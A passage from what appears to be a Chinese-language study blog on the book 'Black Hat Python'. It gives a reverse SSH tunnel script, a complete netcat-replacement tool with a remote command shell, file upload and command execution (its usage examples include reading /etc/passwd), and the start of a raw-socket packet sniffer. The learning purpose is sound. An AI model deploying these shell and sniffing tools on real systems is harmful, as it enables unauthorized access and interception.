<span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        parser.error(<span class="string">&quot;Remote address required (-r).&quot;</span>)</span><br><span class="line"></span><br><span class="line">    g_verbose = options.verbose</span><br><span class="line">    server_host, server_port = get_host_port(args[<span class="number">0</span>], SSH_PORT)</span><br><span class="line">    remote_host, remote_port = get_host_port(options.remote, SSH_PORT)</span><br><span class="line">    <span class="keyword">return</span> options, (server_host, server_port), (remote_host, remote_port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    options, server, remote = parse_options()</span><br><span class="line"></span><br><span class="line">    password = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> options.readpass:</span><br><span class="line">        password = getpass.getpass(<span class="string">&quot;Enter SSH password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.load_system_host_keys()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.WarningPolicy())</span><br><span class="line"></span><br><span class="line">    verbose(<span class="string">&quot;Connecting to ssh host %s:%d ...&quot;</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect(</span><br><span class="line">            server[<span class="number">0</span>],</span><br><span class="line">            server[<span class="number">1</span>],</span><br><span class="line">            username=options.user,</span><br><span class="line">            key_filename=options.keyfile,</span><br><span class="line">            look_for_keys=options.look_for_keys,</span><br><span class="line">            password=password,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*** Failed to connect to %s:%d: %r&quot;</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    verbose(</span><br><span class="line">        <span class="string">&quot;Now forwarding remote port %d to %s:%d ...&quot;</span></span><br><span class="line">        % (options.port, remote[<span class="number">0</span>], remote[<span class="number">1</span>])</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        reverse_forward_tunnel(</span><br><span class="line">            options.port, remote[<span class="number">0</span>], remote[<span class="number">1</span>], client.get_transport()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C-c: Port forwarding stopped.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="總複習-Netcat-Replacement">總複習: Netcat Replacement</h3>
<p><span class="exturl" data-url="aHR0cDovL2JobmV0LnB5">bhnet.py<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># define some global variables</span></span><br><span class="line">listen = <span class="literal">False</span></span><br><span class="line">command = <span class="literal">False</span></span><br><span class="line">upload = <span class="literal">False</span></span><br><span class="line">execute = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">upload_destination = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this runs a command and returns the output</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="comment"># trim the newline</span></span><br><span class="line">    cmd = cmd.rstrip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># run the command and get the output back</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT,</span><br><span class="line">                                         shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        output = e.output</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send the output back to the client</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this handles incoming client connections</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span>(<span class="params">client_socket</span>):</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check for upload</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(upload_destination):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># read in all of the bytes and write to our destination</span></span><br><span class="line">        file_buffer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># keep reading data until none is available</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># now we take these bytes and try to write them out</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = <span class="built_in">open</span>(upload_destination, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">            file_descriptor.write(file_buffer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># acknowledge that we wrote the file out</span></span><br><span class="line">            client_socket.send(</span><br><span class="line">                <span class="string">&quot;Successfully saved file to %s\r\n&quot;</span> % upload_destination)</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            client_socket.send(</span><br><span class="line">                <span class="string">&quot;Failed to save file to %s\r\n&quot;</span> % upload_destination)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check for command execution</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(execute):</span><br><span class="line">        <span class="comment"># run the command</span></span><br><span class="line">        output = run_command(execute)</span><br><span class="line"></span><br><span class="line">        client_socket.send(output)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now we go into another loop if a command shell was requested</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># show a simple prompt</span></span><br><span class="line">            client_socket.send(<span class="string">&quot;&lt;BHP:#&gt; &quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># now we receive until we see a linefeed (enter key)</span></span><br><span class="line">            cmd_buffer = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># we have a valid command so execute it and send back the results</span></span><br><span class="line">            response = run_command(cmd_buffer)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># send back the response</span></span><br><span class="line">            client_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is for incoming connections</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span>():</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if no target is defined we listen on all interfaces</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(target):</span><br><span class="line">        target = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target, port))</span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># spin off a thread to handle our new client</span></span><br><span class="line">        client_thread = threading.Thread(target=client_handler,</span><br><span class="line">                                         args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># if we don&#x27;t listen we are a client... make it so.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span>(<span class="params">buffer</span>):</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># connect to our target host</span></span><br><span class="line">        client.connect((target, port))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if we detect input from stdin send it</span></span><br><span class="line">        <span class="comment"># if not we are going to wait for the user to punch some in</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buffer):</span><br><span class="line">            client.send(buffer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># now wait for data back</span></span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                recv_len = <span class="built_in">len</span>(data)</span><br><span class="line">                response += data</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(response.decode(<span class="string">&#x27;utf-8&#x27;</span>), end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># wait for more input</span></span><br><span class="line">            buffer = <span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            buffer += <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># send it off</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="comment"># just catch generic errors - you can do your homework to beef this up</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exception! Exiting.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Caught exception socket.error: <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># teardown the connection</span></span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Netcat Replacement&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: bhpnet.py -t target_host -p port&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;-l --listen                - listen on [host]:[port] for incoming &quot;</span></span><br><span class="line">        <span class="string">&quot;connections&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;-e --execute=file_to_run   - execute the given file upon receiving &quot;</span></span><br><span class="line">        <span class="string">&quot;a connection&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-c --command               - initialize a command shell&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;-u --upload=destination    - upon receiving connection upload a file &quot;</span></span><br><span class="line">        <span class="string">&quot;and write to [destination]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Examples: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -c&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;echo &#x27;ABCDEFGHI&#x27; | ./bhpnet.py -t 192.168.11.12 -p 135&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read the commandline options</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hle:t:p:cu:&quot;</span>,</span><br><span class="line">                                   [<span class="string">&quot;help&quot;</span>, <span class="string">&quot;listen&quot;</span>, <span class="string">&quot;execute&quot;</span>, <span class="string">&quot;target&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot;port&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;upload&quot;</span>])</span><br><span class="line">        <span class="keyword">for</span> o, a <span class="keyword">in</span> opts:</span><br><span class="line">            <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">&quot;-h&quot;</span>, <span class="string">&quot;--help&quot;</span>):</span><br><span class="line">                usage()</span><br><span class="line">            <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-l&quot;</span>, <span class="string">&quot;--listen&quot;</span>):</span><br><span class="line">                listen = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-e&quot;</span>, <span class="string">&quot;--execute&quot;</span>):</span><br><span class="line">                execute = a</span><br><span class="line">            <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--commandshell&quot;</span>):</span><br><span class="line">                command = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--upload&quot;</span>):</span><br><span class="line">                upload_destination = a</span><br><span class="line">            <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--target&quot;</span>):</span><br><span class="line">                target = a</span><br><span class="line">            <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--port&quot;</span>):</span><br><span class="line">                port = <span class="built_in">int</span>(a)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&quot;Unhandled Option&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># are we going to listen or just send data from STDIN?</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> <span class="built_in">len</span>(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># read in the buffer from the commandline</span></span><br><span class="line">        <span class="comment"># this will block, so send CTRL-D if not sending input</span></span><br><span class="line">        <span class="comment"># to stdin</span></span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># send data off</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we are going to listen and potentially</span></span><br><span class="line">    <span class="comment"># upload things, execute commands and drop a shell back</span></span><br><span class="line">    <span class="comment"># depending on our command line options above</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>就是proxy + run_command + server + client的集大成(不包含SSH)<br>
作為netcat(nc)的替代品</p>
<h2 id="CH3">CH3</h2>
<p>這章就是介紹raw socket，沒有第四層的socket</p>
<p>sniffer_basic.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># host to listen on</span></span><br><span class="line">host = <span class="string">&quot;192.168.0.196&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a raw socket and bind it to the public interface</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_IP</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_ICMP</span><br><span class="line"></span><br><span class="line">sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) </span><br><span class="line"></span><br><span class="line">sniffer.bind((host, <span class="number">0</span>)) <span class="comment"># 沒有第四層，就不用port</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># we want the IP headers included in the capture</span></span><br><span class="line">sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if we&#x27;re on Windows we need to send an IOCTL</span></span><br><span class="line"><span class="comment"># to setup promiscuous mode</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>: </span><br><span class="line">    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read in a single packet</span></span><br><span class="line"><span class="built_in">print</span>(sniffer.recvfrom(<span class="number">65535</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># if we&#x27;re on Windows turn off promiscuous mode</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)</span><br></pre></td></tr></table></figure>
<p>設定一個socket接收所有packet，但收到的資料都是byte，要依據protocol的規定轉成對應的datatype</p>
<hr>
<p>sniffer_ip_header_decode.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># host to listen on</span></span><br><span class="line">host = <span class="string">&quot;192.168.0.187&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP</span>(<span class="params">Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;ihl&quot;</span>, c_ubyte, <span class="number">4</span>),</span><br><span class="line">        (<span class="string">&quot;version&quot;</span>, c_ubyte, <span class="number">4</span>),</span><br><span class="line">        (<span class="string">&quot;tos&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;len&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;id&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;offset&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;ttl&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;protocol_num&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;sum&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;src&quot;</span>, c_uint32),</span><br><span class="line">        (<span class="string">&quot;dst&quot;</span>, c_uint32)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span>(<span class="params">cls, socket_buffer=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> cls.from_buffer_copy(socket_buffer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, socket_buffer=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.socket_buffer = socket_buffer</span><br><span class="line"></span><br><span class="line">        <span class="comment"># map protocol constants to their names</span></span><br><span class="line">        self.protocol_map = &#123;<span class="number">1</span>: <span class="string">&quot;ICMP&quot;</span>, <span class="number">6</span>: <span class="string">&quot;TCP&quot;</span>, <span class="number">17</span>: <span class="string">&quot;UDP&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># human readable IP addresses</span></span><br><span class="line">     